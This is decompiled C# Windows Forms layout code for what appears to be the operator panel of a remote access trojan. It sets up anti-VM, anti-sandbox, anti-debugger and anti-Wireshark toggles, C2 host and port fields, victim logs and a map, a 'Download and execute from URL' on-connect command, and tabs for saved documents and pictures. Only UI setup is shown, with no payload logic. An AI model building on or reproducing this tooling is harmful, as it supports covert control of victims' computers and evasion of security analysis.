		((ButtonBase)ANTIE).set_Text("Anti Emulation");
		((ButtonBase)ANTIE).set_UseVisualStyleBackColor(true);
		((ButtonBase)ANTID).set_AutoSize(true);
		((Control)ANTID).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox aNTID = ANTID;
		location = new Point(9, 78);
		((Control)aNTID).set_Location(location);
		((Control)ANTID).set_Name("ANTID");
		CheckBox aNTID2 = ANTID;
		size = new Size(108, 17);
		((Control)aNTID2).set_Size(size);
		((Control)ANTID).set_TabIndex(3);
		((ButtonBase)ANTID).set_Text("Anti Debugger");
		((ButtonBase)ANTID).set_UseVisualStyleBackColor(true);
		((ButtonBase)ANTIW).set_AutoSize(true);
		((Control)ANTIW).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox aNTIW = ANTIW;
		location = new Point(9, 60);
		((Control)aNTIW).set_Location(location);
		((Control)ANTIW).set_Name("ANTIW");
		CheckBox aNTIW2 = ANTIW;
		size = new Size(110, 17);
		((Control)aNTIW2).set_Size(size);
		((Control)ANTIW).set_TabIndex(2);
		((ButtonBase)ANTIW).set_Text("Anti Wireshark");
		((ButtonBase)ANTIW).set_UseVisualStyleBackColor(true);
		((ButtonBase)ANTISB).set_AutoSize(true);
		((Control)ANTISB).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox aNTISB = ANTISB;
		location = new Point(9, 42);
		((Control)aNTISB).set_Location(location);
		((Control)ANTISB).set_Name("ANTISB");
		CheckBox aNTISB2 = ANTISB;
		size = new Size(102, 17);
		((Control)aNTISB2).set_Size(size);
		((Control)ANTISB).set_TabIndex(1);
		((ButtonBase)ANTISB).set_Text("Anti Sandbox");
		((ButtonBase)ANTISB).set_UseVisualStyleBackColor(true);
		((ButtonBase)ANTIVM).set_AutoSize(true);
		((Control)ANTIVM).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		CheckBox aNTIVM = ANTIVM;
		location = new Point(9, 24);
		((Control)aNTIVM).set_Location(location);
		((Control)ANTIVM).set_Name("ANTIVM");
		CheckBox aNTIVM2 = ANTIVM;
		size = new Size(99, 17);
		((Control)aNTIVM2).set_Size(size);
		((Control)ANTIVM).set_TabIndex(0);
		((ButtonBase)ANTIVM).set_Text("Anti Vmware");
		((ButtonBase)ANTIVM).set_UseVisualStyleBackColor(true);
		((Control)GroupBox4).get_Controls().Add((Control)(object)Button2);
		((Control)GroupBox4).get_Controls().Add((Control)(object)Label10);
		((Control)GroupBox4).get_Controls().Add((Control)(object)Label9);
		((Control)GroupBox4).get_Controls().Add((Control)(object)clientidtextbox);
		((Control)GroupBox4).get_Controls().Add((Control)(object)mutextxtbox);
		GroupBox groupBox29 = GroupBox4;
		location = new Point(12, 162);
		((Control)groupBox29).set_Location(location);
		((Control)GroupBox4).set_Name("GroupBox4");
		GroupBox groupBox30 = GroupBox4;
		size = new Size(265, 73);
		((Control)groupBox30).set_Size(size);
		((Control)GroupBox4).set_TabIndex(3);
		GroupBox4.set_TabStop(false);
		GroupBox4.set_Text("Basic");
		Button button11 = Button2;
		location = new Point(230, 41);
		((Control)button11).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button12 = Button2;
		size = new Size(26, 23);
		((Control)button12).set_Size(size);
		((Control)Button2).set_TabIndex(7);
		((ButtonBase)Button2).set_Text("+");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Label10.set_AutoSize(true);
		((Control)Label10).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label47 = Label10;
		location = new Point(8, 45);
		((Control)label47).set_Location(location);
		((Control)Label10).set_Name("Label10");
		Label label48 = Label10;
		size = new Size(50, 13);
		((Control)label48).set_Size(size);
		((Control)Label10).set_TabIndex(9);
		Label10.set_Text("Mutex :");
		Label9.set_AutoSize(true);
		((Control)Label9).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label49 = Label9;
		location = new Point(8, 21);
		((Control)label49).set_Location(location);
		((Control)Label9).set_Name("Label9");
		Label label50 = Label9;
		size = new Size(67, 13);
		((Control)label50).set_Size(size);
		((Control)Label9).set_TabIndex(8);
		Label9.set_Text("Client ID :");
		((Control)clientidtextbox).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj38 = clientidtextbox;
		location = new Point(76, 17);
		((Control)obj38).set_Location(location);
		((Control)clientidtextbox).set_Name("clientidtextbox");
		TextBox obj39 = clientidtextbox;
		size = new Size(180, 21);
		((Control)obj39).set_Size(size);
		((Control)clientidtextbox).set_TabIndex(0);
		clientidtextbox.set_Text("Guest");
		((Control)mutextxtbox).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj40 = mutextxtbox;
		location = new Point(59, 42);
		((Control)obj40).set_Location(location);
		((Control)mutextxtbox).set_Name("mutextxtbox");
		TextBox obj41 = mutextxtbox;
		size = new Size(168, 21);
		((Control)obj41).set_Size(size);
		((Control)mutextxtbox).set_TabIndex(5);
		((Control)GroupBox6).get_Controls().Add((Control)(object)hostsports);
		((Control)GroupBox6).get_Controls().Add((Control)(object)Addhosts);
		((Control)GroupBox6).get_Controls().Add((Control)(object)Porttxtbox);
		((Control)GroupBox6).get_Controls().Add((Control)(object)hosttxtbox);
		GroupBox groupBox31 = GroupBox6;
		location = new Point(12, 15);
		((Control)groupBox31).set_Location(location);
		((Control)GroupBox6).set_Name("GroupBox6");
		GroupBox groupBox32 = GroupBox6;
		size = new Size(265, 144);
		((Control)groupBox32).set_Size(size);
		((Control)GroupBox6).set_TabIndex(3);
		GroupBox6.set_TabStop(false);
		GroupBox6.set_Text("Network ");
		hostsports.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader14, ColumnHeader15 });
		((Control)hostsports).set_ContextMenuStrip(ContextMenuStrip4);
		((Control)hostsports).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		hostsports.set_FullRowSelect(true);
		hostsports.set_GridLines(true);
		hostsports.set_HideSelection(false);
		ListView obj42 = hostsports;
		location = new Point(6, 41);
		((Control)obj42).set_Location(location);
		((Control)hostsports).set_Name("hostsports");
		ListView obj43 = hostsports;
		size = new Size(253, 97);
		((Control)obj43).set_Size(size);
		((Control)hostsports).set_TabIndex(9);
		hostsports.set_UseCompatibleStateImageBehavior(false);
		hostsports.set_View((View)1);
		ColumnHeader14.set_Text("Hosts");
		ColumnHeader14.set_Width(173);
		ColumnHeader15.set_Text("Ports");
		ContextMenuStrip contextMenuStrip5 = ContextMenuStrip4;
		size = new Size(20, 20);
		((ToolStrip)contextMenuStrip5).set_ImageScalingSize(size);
		((ToolStrip)ContextMenuStrip4).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[4]
		{
			(ToolStripItem)AddToolStripMenuItem1,
			(ToolStripItem)EditToolStripMenuItem,
			(ToolStripItem)RemoveToolStripMenuItem1,
			(ToolStripItem)ClearListToolStripMenuItem1
		});
		((Control)ContextMenuStrip4).set_Name("ContextMenuStrip4");
		ContextMenuStrip contextMenuStrip6 = ContextMenuStrip4;
		size = new Size(124, 108);
		((Control)contextMenuStrip6).set_Size(size);
		((ToolStripItem)AddToolStripMenuItem1).set_Image((Image)(object)Resources.add_icon);
		((ToolStripItem)AddToolStripMenuItem1).set_Name("AddToolStripMenuItem1");
		ToolStripMenuItem addToolStripMenuItem2 = AddToolStripMenuItem1;
		size = new Size(123, 26);
		((ToolStripItem)addToolStripMenuItem2).set_Size(size);
		((ToolStripItem)AddToolStripMenuItem1).set_Text("Add");
		((ToolStripItem)EditToolStripMenuItem).set_Image((Image)(object)Resources._1485015082_textfield_rename);
		((ToolStripItem)EditToolStripMenuItem).set_Name("EditToolStripMenuItem");
		ToolStripMenuItem editToolStripMenuItem = EditToolStripMenuItem;
		size = new Size(123, 26);
		((ToolStripItem)editToolStripMenuItem).set_Size(size);
		((ToolStripItem)EditToolStripMenuItem).set_Text("Edit");
		((ToolStripItem)RemoveToolStripMenuItem1).set_Image((Image)(object)Resources._1484282771_DeleteRed);
		((ToolStripItem)RemoveToolStripMenuItem1).set_Name("RemoveToolStripMenuItem1");
		ToolStripMenuItem removeToolStripMenuItem2 = RemoveToolStripMenuItem1;
		size = new Size(123, 26);
		((ToolStripItem)removeToolStripMenuItem2).set_Size(size);
		((ToolStripItem)RemoveToolStripMenuItem1).set_Text("Remove");
		((ToolStripItem)ClearListToolStripMenuItem1).set_Image((Image)(object)Resources._1484170125_Gnome_Edit_Clear_32);
		((ToolStripItem)ClearListToolStripMenuItem1).set_Name("ClearListToolStripMenuItem1");
		ToolStripMenuItem clearListToolStripMenuItem2 = ClearListToolStripMenuItem1;
		size = new Size(123, 26);
		((ToolStripItem)clearListToolStripMenuItem2).set_Size(size);
		((ToolStripItem)ClearListToolStripMenuItem1).set_Text("Clear list");
		Button addhosts = Addhosts;
		location = new Point(233, 15);
		((Control)addhosts).set_Location(location);
		((Control)Addhosts).set_Name("Addhosts");
		Button addhosts2 = Addhosts;
		size = new Size(26, 23);
		((Control)addhosts2).set_Size(size);
		((Control)Addhosts).set_TabIndex(8);
		((ButtonBase)Addhosts).set_Text("+");
		((ButtonBase)Addhosts).set_UseVisualStyleBackColor(true);
		((Control)Porttxtbox).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		NumericUpDown porttxtbox = Porttxtbox;
		location = new Point(182, 17);
		((Control)porttxtbox).set_Location(location);
		NumericUpDown porttxtbox2 = Porttxtbox;
		num = new decimal(new int[4] { 9999, 0, 0, 0 });
		porttxtbox2.set_Maximum(num);
		NumericUpDown porttxtbox3 = Porttxtbox;
		num = new decimal(new int[4] { 1, 0, 0, 0 });
		porttxtbox3.set_Minimum(num);
		((Control)Porttxtbox).set_Name("Porttxtbox");
		NumericUpDown porttxtbox4 = Porttxtbox;
		size = new Size(50, 21);
		((Control)porttxtbox4).set_Size(size);
		((Control)Porttxtbox).set_TabIndex(1);
		NumericUpDown porttxtbox5 = Porttxtbox;
		num = new decimal(new int[4] { 6969, 0, 0, 0 });
		porttxtbox5.set_Value(num);
		((Control)hosttxtbox).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox obj44 = hosttxtbox;
		location = new Point(6, 17);
		((Control)obj44).set_Location(location);
		((Control)hosttxtbox).set_Name("hosttxtbox");
		TextBox obj45 = hosttxtbox;
		size = new Size(174, 21);
		((Control)obj45).set_Size(size);
		((Control)hosttxtbox).set_TabIndex(0);
		hosttxtbox.set_Text("127.0.0.1");
		((Control)TabPage8).get_Controls().Add((Control)(object)StatusStrip5);
		((Control)TabPage8).get_Controls().Add((Control)(object)Logs);
		TabPage tabPage22 = TabPage8;
		location = new Point(154, 4);
		tabPage22.set_Location(location);
		((Control)TabPage8).set_Name("TabPage8");
		TabPage tabPage23 = TabPage8;
		size = new Size(974, 465);
		((Control)tabPage23).set_Size(size);
		TabPage8.set_TabIndex(5);
		TabPage8.set_Text("Client Logs");
		TabPage8.set_UseVisualStyleBackColor(true);
		StatusStrip statusStrip4 = StatusStrip5;
		size = new Size(20, 20);
		((ToolStrip)statusStrip4).set_ImageScalingSize(size);
		((ToolStrip)StatusStrip5).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)clientsloglabel });
		StatusStrip statusStrip5 = StatusStrip5;
		location = new Point(0, 443);
		((Control)statusStrip5).set_Location(location);
		((Control)StatusStrip5).set_Name("StatusStrip5");
		StatusStrip statusStrip6 = StatusStrip5;
		size = new Size(974, 22);
		((Control)statusStrip6).set_Size(size);
		((Control)StatusStrip5).set_TabIndex(1);
		((Control)StatusStrip5).set_Text("StatusStrip5");
		((ToolStripItem)clientsloglabel).set_Name("clientsloglabel");
		ToolStripStatusLabel obj46 = clientsloglabel;
		size = new Size(101, 17);
		((ToolStripItem)obj46).set_Size(size);
		((ToolStripItem)clientsloglabel).set_Text("Good Morning Sir");
		Logs.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader16, ColumnHeader17 });
		((Control)Logs).set_Dock((DockStyle)5);
		((Control)Logs).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Logs.set_FullRowSelect(true);
		Logs.set_GridLines(true);
		Logs.set_HideSelection(false);
		ListView logs = Logs;
		location = new Point(0, 0);
		((Control)logs).set_Location(location);
		((Control)Logs).set_Name("Logs");
		ListView logs2 = Logs;
		size = new Size(974, 465);
		((Control)logs2).set_Size(size);
		Logs.set_SmallImageList(ImageList1);
		((Control)Logs).set_TabIndex(0);
		Logs.set_UseCompatibleStateImageBehavior(false);
		Logs.set_View((View)1);
		ColumnHeader16.set_Text("User");
		ColumnHeader16.set_Width(765);
		ColumnHeader17.set_Text("Statut");
		ColumnHeader17.set_Width(183);
		((Control)TabPage6).get_Controls().Add((Control)(object)Panel3);
		TabPage tabPage24 = TabPage6;
		location = new Point(154, 4);
		tabPage24.set_Location(location);
		((Control)TabPage6).set_Name("TabPage6");
		TabPage tabPage25 = TabPage6;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage25).set_Padding(padding);
		TabPage tabPage26 = TabPage6;
		size = new Size(974, 465);
		((Control)tabPage26).set_Size(size);
		TabPage6.set_TabIndex(3);
		TabPage6.set_Text("Clients Map");
		TabPage6.set_UseVisualStyleBackColor(true);
		((Control)Panel3).get_Controls().Add((Control)(object)REFF);
		((Control)Panel3).get_Controls().Add((Control)(object)REFM);
		((Control)Panel3).get_Controls().Add((Control)(object)RFM);
		((Control)Panel3).get_Controls().Add((Control)(object)Label1);
		((Control)Panel3).get_Controls().Add((Control)(object)PM);
		((Control)Panel3).set_Dock((DockStyle)5);
		Panel panel3 = Panel3;
		location = new Point(3, 3);
		((Control)panel3).set_Location(location);
		((Control)Panel3).set_Name("Panel3");
		Panel panel4 = Panel3;
		size = new Size(968, 459);
		((Control)panel4).set_Size(size);
		((Control)Panel3).set_TabIndex(4);
		((Control)REFF).set_Anchor((AnchorStyles)10);
		((Control)REFF).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button rEFF = REFF;
		location = new Point(889, 432);
		((Control)rEFF).set_Location(location);
		((Control)REFF).set_Name("REFF");
		Button rEFF2 = REFF;
		size = new Size(75, 23);
		((Control)rEFF2).set_Size(size);
		((Control)REFF).set_TabIndex(7);
		((ButtonBase)REFF).set_Text("Refresh");
		((ButtonBase)REFF).set_UseVisualStyleBackColor(true);
		((Control)REFM).set_Anchor((AnchorStyles)10);
		((Control)REFM).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button rEFM = REFM;
		location = new Point(889, 514);
		((Control)rEFM).set_Location(location);
		((Control)REFM).set_Name("REFM");
		Button rEFM2 = REFM;
		size = new Size(75, 23);
		((Control)rEFM2).set_Size(size);
		((Control)REFM).set_TabIndex(6);
		((ButtonBase)REFM).set_Text("Refresh");
		((ButtonBase)REFM).set_UseVisualStyleBackColor(true);
		((Control)RFM).set_Anchor((AnchorStyles)10);
		((Control)RFM).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button rFM = RFM;
		location = new Point(1297, 839);
		((Control)rFM).set_Location(location);
		((Control)RFM).set_Name("RFM");
		Button rFM2 = RFM;
		size = new Size(75, 23);
		((Control)rFM2).set_Size(size);
		((Control)RFM).set_TabIndex(5);
		((ButtonBase)RFM).set_Text("Refresh");
		((ButtonBase)RFM).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		((Control)Label1).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.White);
		Label label51 = Label1;
		location = new Point(9, 8);
		((Control)label51).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label52 = Label1;
		size = new Size(15, 14);
		((Control)label52).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("..");
		((Control)Label1).set_Visible(false);
		((Control)PM).set_BackColor(Color.Black);
		PM.set_BorderStyle((BorderStyle)1);
		((Control)PM).set_Dock((DockStyle)5);
		PM.set_ErrorImage((Image)(object)Resources._1);
		PM.set_Image((Image)(object)Resources.worldLow);
		PictureBox pM = PM;
		location = new Point(0, 0);
		((Control)pM).set_Location(location);
		((Control)PM).set_Name("PM");
		PictureBox pM2 = PM;
		size = new Size(968, 459);
		((Control)pM2).set_Size(size);
		PM.set_SizeMode((PictureBoxSizeMode)1);
		PM.set_TabIndex(3);
		PM.set_TabStop(false);
		((Control)TabPage7).get_Controls().Add((Control)(object)Panel1);
		((Control)TabPage7).get_Controls().Add((Control)(object)Commandslistview);
		TabPage tabPage27 = TabPage7;
		location = new Point(154, 4);
		tabPage27.set_Location(location);
		((Control)TabPage7).set_Name("TabPage7");
		TabPage tabPage28 = TabPage7;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage28).set_Padding(padding);
		TabPage tabPage29 = TabPage7;
		size = new Size(974, 465);
		((Control)tabPage29).set_Size(size);
		TabPage7.set_TabIndex(4);
		TabPage7.set_Text("On-Connect");
		TabPage7.set_UseVisualStyleBackColor(true);
		((Control)Panel1).get_Controls().Add((Control)(object)AddCommand);
		((Control)Panel1).get_Controls().Add((Control)(object)Label5);
		((Control)Panel1).get_Controls().Add((Control)(object)Label4);
		((Control)Panel1).get_Controls().Add((Control)(object)Commanddata);
		((Control)Panel1).get_Controls().Add((Control)(object)Label2);
		((Control)Panel1).get_Controls().Add((Control)(object)Comands);
		((Control)Panel1).set_Dock((DockStyle)2);
		Panel panel5 = Panel1;
		location = new Point(3, 429);
		((Control)panel5).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel6 = Panel1;
		size = new Size(968, 33);
		((Control)panel6).set_Size(size);
		((Control)Panel1).set_TabIndex(2);
		((Control)AddCommand).set_Anchor((AnchorStyles)11);
		((Control)AddCommand).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Button addCommand = AddCommand;
		location = new Point(856, 4);
		((Control)addCommand).set_Location(location);
		((Control)AddCommand).set_Name("AddCommand");
		Button addCommand2 = AddCommand;
		size = new Size(103, 23);
		((Control)addCommand2).set_Size(size);
		((Control)AddCommand).set_TabIndex(5);
		((ButtonBase)AddCommand).set_Text("Add Command");
		((ButtonBase)AddCommand).set_UseVisualStyleBackColor(true);
		((Control)Label5).set_Anchor((AnchorStyles)7);
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label53 = Label5;
		location = new Point(392, 9);
		((Control)label53).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label54 = Label5;
		size = new Size(12, 13);
		((Control)label54).set_Size(size);
		((Control)Label5).set_TabIndex(4);
		Label5.set_Text("|");
		((Control)Label4).set_Anchor((AnchorStyles)7);
		Label4.set_AutoSize(true);
		((Control)Label4).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label55 = Label4;
		location = new Point(419, 9);
		((Control)label55).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label56 = Label4;
		size = new Size(106, 13);
		((Control)label56).set_Size(size);
		((Control)Label4).set_TabIndex(3);
		Label4.set_Text("Command Data :");
		((Control)Commanddata).set_Anchor((AnchorStyles)7);
		((Control)Commanddata).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TextBox commanddata = Commanddata;
		location = new Point(531, 6);
		((Control)commanddata).set_Location(location);
		((Control)Commanddata).set_Name("Commanddata");
		TextBox commanddata2 = Commanddata;
		size = new Size(212, 21);
		((Control)commanddata2).set_Size(size);
		((Control)Commanddata).set_TabIndex(2);
		((Control)Label2).set_Anchor((AnchorStyles)7);
		Label2.set_AutoSize(true);
		((Control)Label2).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label57 = Label2;
		location = new Point(100, 9);
		((Control)label57).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label58 = Label2;
		size = new Size(75, 13);
		((Control)label58).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("Command :");
		((Control)Comands).set_Anchor((AnchorStyles)7);
		Comands.set_DropDownStyle((ComboBoxStyle)2);
		((Control)Comands).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((ListControl)Comands).set_FormattingEnabled(true);
		Comands.get_Items().AddRange(new object[4] { "Download and execute from URL", "Uninstall", "Restart", "Close" });
		ComboBox comands = Comands;
		location = new Point(181, 6);
		((Control)comands).set_Location(location);
		((Control)Comands).set_Name("Comands");
		ComboBox comands2 = Comands;
		size = new Size(195, 21);
		((Control)comands2).set_Size(size);
		((Control)Comands).set_TabIndex(0);
		Commandslistview.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[3] { ColumnHeader20, ColumnHeader21, ColumnHeader22 });
		((Control)Commandslistview).set_ContextMenuStrip(ContextMenuStrip3);
		((Control)Commandslistview).set_Dock((DockStyle)5);
		((Control)Commandslistview).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Commandslistview.set_FullRowSelect(true);
		Commandslistview.set_GridLines(true);
		Commandslistview.set_HideSelection(false);
		ListView commandslistview = Commandslistview;
		location = new Point(3, 3);
		((Control)commandslistview).set_Location(location);
		((Control)Commandslistview).set_Name("Commandslistview");
		ListView commandslistview2 = Commandslistview;
		size = new Size(968, 459);
		((Control)commandslistview2).set_Size(size);
		((Control)Commandslistview).set_TabIndex(1);
		Commandslistview.set_UseCompatibleStateImageBehavior(false);
		Commandslistview.set_View((View)1);
		ColumnHeader20.set_Text("Command");
		ColumnHeader20.set_Width(586);
		ColumnHeader21.set_Text("Command Data");
		ColumnHeader21.set_Width(207);
		ColumnHeader22.set_Text("Date");
		ColumnHeader22.set_Width(151);
		((Control)TabPage9).get_Controls().Add((Control)(object)BlockedIP);
		((Control)TabPage9).get_Controls().Add((Control)(object)StatusStrip1);
		TabPage tabPage30 = TabPage9;
		location = new Point(154, 4);
		tabPage30.set_Location(location);
		((Control)TabPage9).set_Name("TabPage9");
		TabPage tabPage31 = TabPage9;
		size = new Size(974, 465);
		((Control)tabPage31).set_Size(size);
		TabPage9.set_TabIndex(6);
		TabPage9.set_Text("Black List");
		TabPage9.set_UseVisualStyleBackColor(true);
		BlockedIP.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { ColumnHeader18, ColumnHeader19 });
		((Control)BlockedIP).set_ContextMenuStrip(ContextMenuStrip2);
		((Control)BlockedIP).set_Dock((DockStyle)5);
		((Control)BlockedIP).set_Font(new Font("Verdana", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		BlockedIP.set_FullRowSelect(true);
		BlockedIP.set_GridLines(true);
		BlockedIP.set_HideSelection(false);
		ListView blockedIP = BlockedIP;
		location = new Point(0, 0);
		((Control)blockedIP).set_Location(location);
		((Control)BlockedIP).set_Name("BlockedIP");
		ListView blockedIP2 = BlockedIP;
		size = new Size(974, 443);
		((Control)blockedIP2).set_Size(size);
		BlockedIP.set_SmallImageList(ImageList1);
		((Control)BlockedIP).set_TabIndex(1);
		BlockedIP.set_UseCompatibleStateImageBehavior(false);
		BlockedIP.set_View((View)1);
		ColumnHeader18.set_Text("IP");
		ColumnHeader18.set_Width(440);
		ColumnHeader19.set_Text("Date");
		ColumnHeader19.set_Width(198);
		StatusStrip statusStrip7 = StatusStrip1;
		size = new Size(20, 20);
		((ToolStrip)statusStrip7).set_ImageScalingSize(size);
		((ToolStrip)StatusStrip1).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)blacklistlabel });
		StatusStrip statusStrip8 = StatusStrip1;
		location = new Point(0, 443);
		((Control)statusStrip8).set_Location(location);
		((Control)StatusStrip1).set_Name("StatusStrip1");
		StatusStrip statusStrip9 = StatusStrip1;
		size = new Size(974, 22);
		((Control)statusStrip9).set_Size(size);
		((Control)StatusStrip1).set_TabIndex(0);
		((Control)StatusStrip1).set_Text("StatusStrip1");
		((ToolStripItem)blacklistlabel).set_Name("blacklistlabel");
		ToolStripStatusLabel obj47 = blacklistlabel;
		size = new Size(101, 17);
		((ToolStripItem)obj47).set_Size(size);
		((ToolStripItem)blacklistlabel).set_Text("Total Blocked ( 0 )");
		((Control)TabPage11).get_Controls().Add((Control)(object)TabControl1);
		((Control)TabPage11).get_Controls().Add((Control)(object)REF);
		((Control)TabPage11).get_Controls().Add((Control)(object)TreeView1);
		TabPage tabPage32 = TabPage11;
		location = new Point(154, 4);
		tabPage32.set_Location(location);
		((Control)TabPage11).set_Name("TabPage11");
		TabPage tabPage33 = TabPage11;
		size = new Size(974, 465);
		((Control)tabPage33).set_Size(size);
		TabPage11.set_TabIndex(8);
		TabPage11.set_Text("Saved Data");
		TabPage11.set_UseVisualStyleBackColor(true);
		((Control)TabControl1).set_Anchor((AnchorStyles)15);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage12);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage13);
		((Control)TabControl1).set_Font(new Font("Verdana", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		TabControl tabControl3 = TabControl1;
		location = new Point(235, 6);
		((Control)tabControl3).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl4 = TabControl1;
		size = new Size(720, 486);
		((Control)tabControl4).set_Size(size);
		((Control)TabControl1).set_TabIndex(2);
		((Control)TabPage12).get_Controls().Add((Control)(object)StatusStrip2);
		((Control)TabPage12).get_Controls().Add((Control)(object)TextBox1);
		TabPage tabPage34 = TabPage12;
		location = new Point(4, 23);
		tabPage34.set_Location(location);
		((Control)TabPage12).set_Name("TabPage12");
		TabPage tabPage35 = TabPage12;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage35).set_Padding(padding);
		TabPage tabPage36 = TabPage12;
		size = new Size(712, 459);
		((Control)tabPage36).set_Size(size);
		TabPage12.set_TabIndex(0);
		TabPage12.set_Text("Documents");
		TabPage12.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip2).set_AutoSize(false);
		StatusStrip statusStrip10 = StatusStrip2;
		size = new Size(20, 20);
		((ToolStrip)statusStrip10).set_ImageScalingSize(size);
		((ToolStrip)StatusStrip2).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel1 });
		StatusStrip statusStrip11 = StatusStrip2;
		location = new Point(3, 433);
		((Control)statusStrip11).set_Location(location);
		((Control)StatusStrip2).set_Name("StatusStrip2");
		StatusStrip statusStrip12 = StatusStrip2;
		size = new Size(706, 23);
		((Control)statusStrip12).set_Size(size);
		((Control)StatusStrip2).set_TabIndex(3);
		((Control)StatusStrip2).set_Text("StatusStrip2");
		((ToolStripItem)ToolStripStatusLabel1).set_Name("ToolStripStatusLabel1");
		ToolStripStatusLabel toolStripStatusLabel = ToolStripStatusLabel1;
		size = new Size(139, 18);
		((ToolStripItem)toolStripStatusLabel).set_Size(size);
		((ToolStripItem)ToolStripStatusLabel1).set_Text("Ready to any command !");
		((Control)TextBox1).set_Anchor((AnchorStyles)15);
		((TextBoxBase)TextBox1).set_BackColor(Color.White);
		TextBox textBox = TextBox1;
		location = new Point(3, 3);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		((TextBoxBase)TextBox1).set_ReadOnly(true);
		TextBox1.set_ScrollBars((ScrollBars)3);
		TextBox textBox2 = TextBox1;
		size = new Size(709, 426);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		((Control)TabPage13).get_Controls().Add((Control)(object)StatusStrip3);
		((Control)TabPage13).get_Controls().Add((Control)(object)PictureBox1);
		TabPage tabPage37 = TabPage13;
		location = new Point(4, 23);
		tabPage37.set_Location(location);
		((Control)TabPage13).set_Name("TabPage13");
		TabPage tabPage38 = TabPage13;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage38).set_Padding(padding);
		TabPage tabPage39 = TabPage13;
		size = new Size(712, 459);
		((Control)tabPage39).set_Size(size);
		TabPage13.set_TabIndex(1);
		TabPage13.set_Text("Pictures");
		TabPage13.set_UseVisualStyleBackColor(true);
		((ToolStrip)StatusStrip3).set_AutoSize(false);
		StatusStrip statusStrip13 = StatusStrip3;
		size = new Size(20, 20);
		((ToolStrip)statusStrip13).set_ImageScalingSize(size);
		((ToolStrip)StatusStrip3).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel2 });
		StatusStrip statusStrip14 = StatusStrip3;
		location = new Point(3, 433);
		((Control)statusStrip14).set_Location(location);
		((Control)StatusStrip3).set_Name("StatusStrip3");
		StatusStrip statusStrip15 = StatusStrip3;
		size = new Size(706, 23);
		((Control)statusStrip15).set_Size(size);
		((Control)StatusStrip3).set_TabIndex(4);
		((Control)StatusStrip3).set_Text("StatusStrip3");
		((ToolStripItem)ToolStripStatusLabel2).set_Name("ToolStripStatusLabel2");
